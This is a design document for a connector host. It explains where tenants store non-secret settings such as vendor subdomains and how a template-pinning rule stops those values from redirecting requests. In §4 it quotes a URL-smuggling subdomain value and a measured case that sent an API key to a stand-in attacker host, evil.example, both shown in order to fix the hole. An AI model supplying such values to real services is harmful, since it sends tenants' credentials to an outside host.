---
story: X-47
status: accepted
---

# Connection settings: a home for the value that is not a secret

Where a tenant puts the `{subdomain}` in `https://{subdomain}.zendesk.com`, why that place is *not*
the credential store, and why supplying it does not become a way for a caller to name a host.

Extends [`connections.md`](connections.md), which made a credential address a function of the
resolved principal and the connector's own declaration, and deferred exactly this: *"a vendor
subdomain is exactly the per-instance fact with no home until two instances can be told apart"*.

## What X-12 exposed

X-12 made this host execute, and the first thing that fell out was a count. **Seventeen of the
fifty-three shipped connectors cannot be invoked at all** — bitbucket, cloudflare, confluence,
contentful, docusign, freshdesk, jira, mailchimp, newrelic, okta, salesforce, shopify, statuspage,
supabase, twilio, vercel, zendesk — because each declares a per-connection value its operations
substitute into a request, and there was nowhere for a tenant to put one. `execution::invoker` bound
`MemoryConfig::new()`, so every one of them refused by name.

The refusal was correct. It failed closed, and it named the field, the service and the tenant. But a
correct refusal is still a connector that does not work, and the shipped surface ran thirty-six of
fifty-three.

The story's own note says thirteen. The measured number is seventeen, and the difference is the
whole of § *The surface is read off the connector, not off its base URL* below. **Thirteen of the
seventeen are made configurable here; four are refused on purpose (§4), so this ships 49 of 53.**

## §1 The value lives in a second store, and that is the decision

**Decision: connection settings are kept in their own file, behind their own port, with their own
two bounds. The credential store is not touched.**

The Acceptance asks for this to be argued rather than assumed, so here is the argument, in the order
the costs bite.

**A subdomain is not a secret.** It is in the URL of every request the connector makes, in every
audit record of one, and in the vendor's own dashboard. Storing it at `0600` beside an API token
claims a protection it does not need — and weakens the claim about the token, because a store whose
contents are "mostly not secret" is one nobody treats as a secret store.

**`held` would come to mean two things.** `GET /api/connections` reports, per declared credential,
whether this tenant holds a value at its address. A subdomain written into the credential store is a
value at an address. A connection carrying a subdomain and **no token** would report as held; and
`DELETE`, whose reason to exist is revoking a leaked secret, would report a subdomain among the
credentials it destroyed. That is `connections.md`'s central vocabulary quietly meaning two things.

**The tenant occupancy bound would come to mean two things.** `MAX_TENANT_STORE_BYTES` exists
because `connector_secrets::FileStore` rewrites and `fsync`s one file under one mutex, so one
tenant's size is every other tenant's *credential* write latency. Settings spent against that
allowance would let an operator fill it with subdomains and be told to *"disconnect a connector you
no longer use"* — advice about the wrong store. So this store carries `MAX_SETTING_VALUE_BYTES`
(1 KiB, four times the longest hostname DNS admits) and `MAX_TENANT_SETTINGS_BYTES` (16 KiB), and
the two allowances are never summed.

**Upstream already drew this line.** `connector-pack` has two ports, not one, and says why: a value
arriving through `ConfigStore` *"carries no redaction guarantee"*, which is precisely why a secret
may not travel through it. Storing settings as credentials here would be this repository disagreeing
with the crate it hands both to.

What the two stores **do** share is where they may sit. `exchange_host::paths` is one walk, asked by
both before either is created, because *"is this path somewhere a commit could pick it up"* is one
question — and a tenant's list of vendor accounts committed to a repository is a real leak even
though it is not a credential one. The two functions moved out of `credentials.rs` verbatim.

## §2 The address is derived, and no route accepts a tenant

Keyed exactly as `connector-pack`'s own port is, which this host does not get to change:

```text
(tenant, connector, service, kind, name)
 ^^^^^^  ^^^^^^^^^  ^^^^^^^  ^^^^^^^^^^^
 |       |          |        the `binds` target — `endpoint.subdomain`
 |       |          the operation's own service, `default` for a single-surface connector
 |       a catalogue key
 `Principal::tenant(), from the guard
```

The surface:

| Route | Method | What the caller supplies |
| --- | --- | --- |
| `/api/connections/{connector}/settings` | `GET` | a connector id |
| `/api/connections/{connector}/settings/{service}/{field}` | `PUT`, `DELETE` | a connector id, a service, a `binds` target, and on `PUT` a value |

`{service}` and `{field}` are keys into what the connector's operations declare, exactly as
`{connector}` is a key into the catalogue — refused when nothing declares them, and never a segment
of anything. `connections::tests::no_route_here_accepts_an_address` guards the parameter list and
was widened by these two names with the same behavioural payment X-39 made for `{credential}`:
`a_hostile_service_or_field_cannot_reach_the_settings_address`.

**The service is a required path segment and does not default to `default`.** `contentful` declares
`endpoint.space_id` under both `delivery` and `management`, and a value silently filed under the
wrong one is a management write into a space nobody named — upstream's C-197, which is a measured
incident rather than a hypothetical.

**Values go in and do not come back out.** `GET` answers with `binds` targets and a `set` boolean.
That is stricter than the "not a secret" argument requires, and it is the direction that cannot be
wrong: a `username` field holds an account name or an email address, which is a customer's personal
data whatever the field is called. Adding a read later is additive; removing one is not.

## §3 The surface is read off the connector, not off its base URL

`declared_settings` answers *what does this connector need configured* through
`connector_pack::Rehearsal`, which parses the operation's own emitted Flux — the same derivation the
pack makes when it projects an operation for real.

Scanning `base_url` for `{placeholders}` is the obvious cheaper version and it is **wrong**, by
measurement:

| connector | `base_url` | what its operations actually need |
| --- | --- | --- |
| zendesk | `https://{subdomain}.zendesk.com` | `endpoint.subdomain` |
| bitbucket | `https://api.bitbucket.org/2.0` | `endpoint.workspace` |
| cloudflare | `https://api.cloudflare.com/client/v4` | `endpoint.zone_id` |
| contentful | `https://api.contentful.com` | `endpoint.space_id` and `endpoint.environment_id`, **twice** — once per service |
| statuspage | `https://api.statuspage.io/v1/pages/{page_id}` | `endpoint.page_id` |
| vercel | `https://api.vercel.com` | `endpoint.teamId` |
| docusign | `https://{account_host}/restapi/…/{account_id}` | `endpoint.account_host` **and** `endpoint.account_id` |

A base-URL scan finds twelve of the seventeen and misses five: `bitbucket`, `cloudflare`,
`contentful` and `vercel`, whose endpoint variables sit elsewhere in the operation's Flux, and
`twilio`, which needs only a Basic user half that no URL scan could find at all. A host enumerating
the surface that way would tell an operator they had supplied everything and then refuse the call.

The second kind is the non-secret user half of a `basic` credential — `Field::Username`. Four
connectors need one (zendesk, jira, confluence, twilio), and **zendesk needs both kinds**: without
the user half it refuses before it ever reaches the subdomain. A story that shipped only
`endpoint.*` would have left its own headline connector uninvocable — and would have missed `twilio`
entirely, which needs a username and nothing else.

## §4 Supplying configuration does not become a way to name a host

**This section is a correction.** The first cut of X-47 argued that `connector-pack` already
prevents this, and shipped a hole. The argument is recorded here with its flaw, because the flaw is
the interesting part.

### What the first cut argued, and why it was vacuous

The attack shape was identified correctly:

```text
subdomain = "acme.zendesk.com@evil.example"
  -> https://acme.zendesk.com@evil.example.zendesk.com/api/v2/tickets/1.json
     authority: evil.example.zendesk.com
```

and the defence was correctly located: `connector-pack` holds the composed authority to an
allow-list of host characters, so `@`, `:`, `/` and `%` cannot appear and no admissible value can
delimit. That defence is real, and against **zendesk** it is complete — the template pins
`.zendesk.com`, so every authority any admissible value composes is inside the vendor's domain.

The flaw is that a character allow-list constrains **what a value looks like** and says nothing
about **where the request goes**. Those two coincide only when the template pins a suffix. Where the
variable *is* the authority they come apart entirely, and `evil.example` is a perfectly ordinary
hostname that the character check admits without complaint.

Measured on the shipped catalogue, before the fix:

```text
newrelic endpoint.host="evil.example"  stored_ok=true  outcome=OK
  urls=["https://evil.example/v2/applications.json"]  X-Api-Key on the wire
```

The writer needed no special standing: the settings route is `Access::Principal`, which
`require_principal` admits for any kind, and an agent token resolves to `PrincipalKind::Agent`. That
is `AGENTS.md`'s *"an agent's token grants access to an operation, never to a credential"*, broken
through a configuration field — and it was **new reachability**, because before the diff
`execution::invoker` bound `MemoryConfig::new()` and both connectors refused before dispatch.

### The rule, and where it is decided

**Decision: a tenant may supply an endpoint variable only if every host template carrying it pins a
literal vendor suffix. Where the variable is the whole authority, no value is accepted and the
connector stays uninvocable.**

The distinction is published and needs no new dependency: `connector_catalog::Operation::hosts`
carries each operation's host templates with their templating intact. (`connector-pack`'s own `Slot`
would also answer it and is `pub(crate)`, so the catalogue is what carries this.)

`exchange_host::host_pinning` returns one of three answers:

| answer | example | tenant may supply |
| --- | --- | --- |
| `OutsideTheAuthority` | `bitbucket` `workspace` — in no host template | yes |
| `PinnedTo(".zendesk.com")` | `zendesk` `hosts: ["{subdomain}.zendesk.com"]` | yes |
| `WholeAuthority("{host}")` | `newrelic` `hosts: ["{host}"]` | **no** |

"Pins" means: the text after the last placeholder is a literal beginning with `.` and carrying at
least two further labels. Two rather than one because `.com` pins nothing anybody cannot register
under. The honest name for what is wanted is a public-suffix list, which this crate may not take as
a dependency; the approximation is stated rather than hidden and it errs closed.

The rule is about the **template**, never about the value. A rule that inspected values would be a
blocklist of hosts, and a blocklist only catches what somebody enumerated — the same argument
`tests/no_second_request_path.rs` makes for its dependency allow-list. `acme.newrelic.com` is refused
exactly as `evil.example` is.

### What it costs: four connectors, named

| connector | template | consequence |
| --- | --- | --- |
| `newrelic` | `{host}` | uninvocable — `newrelic.api_key` would travel |
| `okta` | `{domain}` | uninvocable — `okta.api_token` would travel |
| `docusign` | `{account_host}` | uninvocable — `docusign.access_token` would travel |
| `freshdesk` | `{domain}` | uninvocable — declares no credential, but this host would still be an open proxy |

**The review that found this named two of them.** The measurement finds four: `freshdesk` and `okta`
are the same defect and were not in the report. That is the argument for deciding this from the
catalogue rather than from a list — a list would have shipped two more holes, and the test that
pins the set (`no_shipped_connector_lets_a_tenant_supply_its_whole_authority`) fails if a fifth
arrives.

So the shipped surface is **49 of 53**, not 53 of 53, and the four are refused with their own
template quoted. `GET .../settings` reports `configurable: false` and a per-field `reason`, so a
connector refused on purpose does not read as a broken one. A smaller working surface beats a larger
one that leaks.

### Where it is enforced

Twice, deliberately.

- `ConnectionSettings::set` refuses, so nothing arriving through this host's surface is stored.
- `ConfigStore::get` refuses again on the way out, so the property belongs to the **port** rather
  than to one write path — an edited file, a backup taken before this rule existed, or a value
  written by an older build all bypass `set` and none of them bypass this.

The value is not deleted when `get` refuses it: **refuse; never repair.** A store that silently
rewrote a file it found suspicious would destroy the evidence of how the value got there.

An operator who genuinely needs one of these four binds their own `ConfigStore` in a composition
they control. That is a decision made once at startup by somebody who can read this section — not
one a request can make.

## §5 A missing value is still refused by name

This story adds a way to *supply* a value. It does not weaken the refusal, and the refusal is not
this host's to weaken — it is `connector_pack::Error::MissingConfig`, arriving through
`InvokeRefusal::Refused` unchanged.

What did change is that the refusal is now **actionable**. The message names `endpoint.subdomain`;
until now there was nowhere to put one. `POST /api/operations/{operation}/invoke` therefore answers a
`refused` with a `supply_at` field naming the settings route for that operation's connector. It is
derived from the catalogue and not parsed out of upstream's prose — for the same reason the design
already gives for not splitting an `address` field out of the message — so it points at the
connector's settings *collection*, which lists every field and which of them this tenant has
supplied.

## §6 Where this sits relative to X-14 — before it, and not in its way

**This lands first, and it costs X-14 one line.**

X-14 gives the *credential* address an `@instances/<uuid>` level, so a tenant can hold a sandbox
Zendesk beside a production one. This story gives a connection the values it needs to resolve at all.
They are independent today and compose later.

The reasoning for the order:

- The settings key is **upstream's**, not this repository's: `ConfigStore::get` takes
  `(tenant, provider, service, field)` and has no instance parameter. Doing X-14 first would have
  meant designing an instance-aware settings key against a port that cannot express one — a shape
  upstream would have to move before this host could.
- Doing this first costs X-14 exactly what `address_of_declared` already costs it: one more
  component in `SettingsStore::at`, which is the single place a settings address is composed, and
  nothing else. Both stories then insert the same level at their own one seam.
- The `409` in `already_connected` — the X-14 placeholder that refuses a second connection to one
  connector — is untouched, and is still the thing that keeps this coherent meanwhile.

## §7 What this does not do

- **No console.** The surface is HTTP only; rendering "connect your Zendesk" needs the labels and
  help text of upstream's C-87, which the catalogue does not publish.
- **No read-back of values.** §2 argues why, and says which direction the omission errs in.
- **No per-instance settings.** §6.
- **Four connectors this host will not let a tenant configure at all** — `newrelic`, `okta`,
  `docusign`, `freshdesk`. Not an oversight and not a gap to close later by relaxing §4: closing it
  needs a place for an *operator* to pin an allowed host per tenant, which is a new surface with its
  own authorization question and belongs in its own story. Until then they refuse, and the refusal
  says which connector, which template and why.
- **No validation of what a value means.** This host refuses a value at an address the connector
  never declared, and one past a bound. Whether `acme` is a real Zendesk subdomain is a question only
  Zendesk can answer, and it answers it with a `404` that reaches the caller whole.
- **The store is single-process**, like `ConnectionGuard`: the read-decide-write around the tenant
  allowance is claimed within this process and not across a cluster. The same limit `connections.md`
  already records, in the same words.
